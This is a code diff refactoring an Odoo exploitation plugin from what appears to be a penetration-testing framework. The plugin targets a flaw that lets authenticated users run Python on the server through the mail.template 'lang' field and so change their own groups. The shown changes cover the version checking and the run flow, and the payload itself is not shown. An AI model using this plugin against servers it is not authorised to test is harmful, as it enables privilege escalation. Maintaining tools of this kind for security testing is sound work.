@@ -1,6 +1,6 @@
 from enum import Enum
+import re
 from ..colors import Colors
-from packaging.version import Version
 from .plugin_base import BasePlugin, PluginMetadata, PluginCategory
 
 class VulnerableStatus(Enum):
@@ -9,9 +9,9 @@ class VulnerableStatus(Enum):
     NOT_VULNERABLE = 3
 
 class Plugin(BasePlugin):
-    """Exploit found on Odoo allowing any authenticated user to
+    """Exploit in Odoo allowing any authenticated user to
     execute 'some' arbitrary python code on the server.
-    Thus allowing changing its own groups.
+    Thus changing their own groups.
 
     By Guilhem RIOUX (@jrjgjk)
     Orange Cyberdefense
@@ -34,22 +34,27 @@ class Plugin(BasePlugin):
             category=PluginCategory.EXPLOITATION,
             requires_auth=True,
             requires_connection=True,
-            external_dependencies=["packaging"]
+            external_dependencies=[""]
         )
+
+    @classmethod
+    def parse_version(cls, version_str):
+        """Convert a version string like '14.0' into a tuple (14,0)"""
+        return tuple(int(x) for x in version_str.split(".") if x.isdigit())
 
     @classmethod
     def is_version_vulnerable(cls, version):
         """
         Compare the version of the target with those
-        stored on the class field
-
-        :type version: Union[str, Version]
+        stored on the class fields (no external packages needed)
         """
         if isinstance(version, str):
-            version = Version(version)
+            version = cls.parse_version(version)
 
-        return (version <= Version(cls.MAX_VERSION)
-               and version > Version(cls.MIN_VERSION))
+        min_v = cls.parse_version(cls.MIN_VERSION)
+        max_v = cls.parse_version(cls.MAX_VERSION)
+
+        return min_v < version <= max_v
 
     @staticmethod
     def get_payload():
@@ -62,8 +67,8 @@ class Plugin(BasePlugin):
 
     def get_values_to_write(self):
         """
-        Get the dictionnary of the values that will be written
-        on the `mail.template` table
+        Get the dictionary of values that will be written
+        to the `mail.template` table
         """
         return {"lang": self.__class__.get_payload(),
                 "model": self.model}
@@ -82,30 +87,35 @@ class Plugin(BasePlugin):
 
     def check(self, db, username, password):
         """
-        Check if the target is vulnerable
+        Check if the target is vulnerable.
 
-        Basically, you need three things for a target to be
-        vulnerable:
-          1. Version must match (Will not be default anymore)
-          2. Mail module must be loaded (Not Default)
-          3. Ability to edit `mail.template` (Default)
+        A target is considered vulnerable if:
+          1. Its Odoo version is within the vulnerable range.
+          2. The 'mail' module is loaded.
+          3. The current user can edit the `mail.template` table.
         """
+
         if not self.connection.authenticate(db, username, password):
-            print(f"{Colors.e} Authentication invalid")
             exit(0)
 
         if not self._is_module_loaded():
-            return VulnerableStatus.NOT_VULNERABLE
+            return VulnerableStatus.NOT_VULNERABLE, "Mail module is not loaded"
 
-        version = self.connection.get_version()
-        if (not version
-            or not version.get("server_version")):
-            return VulnerableStatus.UNKNOWN
+        version_info = self.connection.get_version()
+        if not version_info or not version_info.get("server_version"):
+            return VulnerableStatus.UNKNOWN, "Could not determine Odoo version"
 
-        target_version = Version(version.get("server_version"))
-        if self.__class__.is_version_vulnerable(target_version):
-            return VulnerableStatus.VULNERABLE
-        return VulnerableStatus.NOT_VULNERABLE
+        raw_version = version_info.get("server_version")
+        match = re.search(r'(\d+(\.\d+)*)', str(raw_version))
+        version = match.group(1) if match else None
+
+        if not version:
+            return VulnerableStatus.UNKNOWN, "Failed to parse Odoo version"
+
+        if self.__class__.is_version_vulnerable(version):
+            return VulnerableStatus.VULNERABLE, f"(Version {version})"
+        
+        return VulnerableStatus.NOT_VULNERABLE, f"Version {version} is not vulnerable"
 
     def run(self,
             target_url,
@@ -122,18 +132,19 @@ class Plugin(BasePlugin):
             print(f"{Colors.e} This plugin requires authentication")
             return "Failed"
 
-        vulnerability_status = self.check(database, username, password)
-        if vulnerability_status is VulnerableStatus.NOT_VULNERABLE :
-            print(f"{Colors.e} Target is not vulnerable")
+        vulnerability_status, reason = self.check(database, username, password)
+        if vulnerability_status is VulnerableStatus.NOT_VULNERABLE:
+            print(f"{Colors.e} Target is not vulnerable: {reason}")
             return "Failed"
 
         if vulnerability_status is VulnerableStatus.UNKNOWN:
-            print(f"{Colors.w} Unable to recover the version of the target", end=", ")
+            print(f"{Colors.w} Vulnerability unknown: {reason}")
         else:
-            print(f"{Colors.s} Target is vulnerable", end=", ")
+            print(f"{Colors.s} Target is vulnerable: {reason}")
 
-        run_exploit = input("Continue exploit ? [y/n] ")
-        if run_exploit not in ('y', 'Y'):
+
+        run_exploit = input("Continue exploit? [y/N]: ").strip().lower()
+        if run_exploit not in ('y', 'yes'):
             print(f"{Colors.w} Aborting exploit")
             return "Aborted"
 
